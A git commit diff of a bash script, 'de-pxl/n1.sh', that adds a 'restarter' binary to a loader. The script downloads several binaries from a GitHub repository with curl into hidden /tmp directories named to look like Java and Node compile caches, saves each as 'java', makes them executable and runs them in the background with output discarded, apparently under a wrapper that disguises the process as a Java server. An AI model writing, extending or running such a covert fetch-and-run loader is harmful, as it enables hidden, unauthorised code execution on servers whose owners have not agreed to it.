6c2fe9abbbc8a7a80074b0f956959424b8162162
i51jir6ni9t0 <wker-one@protonmail.com>
2026-04-09 15:50:15 +0000

    DE-PXL: Add restarter

--- de-pxl/n1.sh
+++ de-pxl/n1.sh
@@ -1,16 +1,17 @@
 #!/bin/bash
 
 function fetch_files() {
-    mkdir -p /tmp/.java/bin/{.a,.b}  /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/{etc,log}
+    mkdir -p /tmp/.java/bin/{.a,.b,.c}  /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/{etc,log}
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/uid-amd64-v0.1.3 -o uid
     cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o java
     cd /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/etc && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/de-pxl/n1.conf -o supervisord.conf
     cd /tmp/.java/bin/.a && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/chsl-v1.11.5-amd64 -o java
     cd /tmp/.java/bin/.b && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/gnet-v1.4.43-amd64 -o java
+    cd /tmp/.java/bin/.c && curl -L https://github.com/i51jir6ni9t0/backup/releases/download/v0.1/cntr-restart -o java
 }
 
 function start_app() {
-    chmod a+x /tmp/.java/bin/***  /tmp/.java/bin/.a/***  /tmp/.java/bin/.b/***
+    chmod a+x /tmp/.java/bin/***  /tmp/.java/bin/.a/***  /tmp/.java/bin/.b/*** /tmp/.java/bin/.c/***
     cd /tmp/_node-compile-cache/v24.14.1-x64-cf738c9d-0/log && nohup /tmp/.java/bin/uid ~~m ~~n 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ~~f /tmp/.java/bin/java >/dev/null 2>&1 &
 }
 
